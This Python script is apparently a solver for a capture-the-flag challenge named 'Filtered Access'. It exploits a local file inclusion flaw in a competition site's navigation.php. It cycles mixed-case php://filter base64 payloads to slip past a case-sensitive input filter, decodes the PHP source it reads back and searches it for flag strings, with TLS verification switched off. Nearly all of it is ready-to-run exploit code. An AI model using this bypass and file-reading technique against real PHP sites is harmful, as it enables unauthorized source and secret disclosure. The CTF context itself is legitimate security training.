#!/usr/bin/env python3
"""
Filtered Access - CTF Exploit Script
=====================================
Exploits LFI vulnerability with PHP filter bypass (case-sensitive filter)

Vulnerability: Local File Inclusion (LFI) with weak input filtering
Bypass: Mixed case PHP wrapper (PhP:// instead of php://)
"""

import requests
import base64
import re
import sys
import urllib3

# Disable SSL warnings (for CTF environments)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target configuration
BASE_URL = "https://mnbvcxzqwertyu-csc26.cybersecuritychallenge.al"
VULN_ENDPOINT = "/navigation.php"

# PHP filter bypass payloads (case variations to bypass filters)
FILTER_BYPASSES = [
    "PhP://filter/convert.base64-encode/resource=",
    "pHp://filter/convert.base64-encode/resource=",
    "Php://filter/convert.base64-encode/resource=",
    "pHP://filter/convert.base64-encode/resource=",
    "PHP://filter/convert.base64-encode/resource=",
]


def exploit_lfi(target_file: str = "flag") -> str:
    """
    Exploit the LFI vulnerability to read PHP source files.
    
    Args:
        target_file: The PHP file to read (without .php extension)
    
    Returns:
        Decoded source code of the target file
    """
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Attempting to read: {target_file}.php")
    print("-" * 50)
    
    for bypass in FILTER_BYPASSES:
        payload = f"{bypass}{target_file}"
        url = f"{BASE_URL}{VULN_ENDPOINT}"
        params = {"page": payload}
        
        print(f"[*] Trying bypass: {bypass[:10]}...")
        
        try:
            response = requests.get(url, params=params, verify=False, timeout=10)
            
            # Check if blocked
            if "Dangerous input detected" in response.text:
                print(f"[-] Blocked by filter")
                continue
            
            # Check for base64 content
            if response.text and len(response.text) > 10:
                # Try to decode base64
                try:
                    # Clean the response (remove any HTML)
                    b64_content = response.text.strip()
                    decoded = base64.b64decode(b64_content).decode('utf-8', errors='ignore')
                    
                    if decoded and '<?php' in decoded.lower() or 'flag' in decoded.lower():
                        print(f"[+] SUCCESS! Filter bypassed with: {bypass[:15]}...")
                        print("-" * 50)
                        return decoded
                except Exception:
                    pass
                    
        except requests.RequestException as e:
            print(f"[-] Request failed: {e}")
            continue
    
    return None


def extract_flag(source_code: str) -> str:
    """Extract flag from PHP source code."""
    # Common flag patterns
    patterns = [
        r'CSC\d+\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'CTF\{[^}]+\}',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, source_code, re.IGNORECASE)
        if match:
            return match.group(0)
    
    return None


def main():
    print("=" * 50)
    print("  Filtered Access - LFI Exploit")
    print("  CTF Challenge Solver")
    print("=" * 50)
    print()
    
    # Default target is 'flag', but allow custom file
    target = sys.argv[1] if len(sys.argv) > 1 else "flag"
    
    # Run exploit
    source = exploit_lfi(target)
    
    if source:
        print("[+] Decoded PHP Source Code:")
        print("-" * 50)
        print(source)
        print("-" * 50)
        
        # Extract flag
        flag = extract_flag(source)
        if flag:
            print()
            print("=" * 50)
            print(f"[+] FLAG FOUND: {flag}")
            print("=" * 50)
        else:
            print("[!] No flag pattern found in source, check manually")
    else:
        print("[-] Exploit failed - all bypasses blocked")
        print("[!] Try manually with different case variations")


if __name__ == "__main__":
    main()
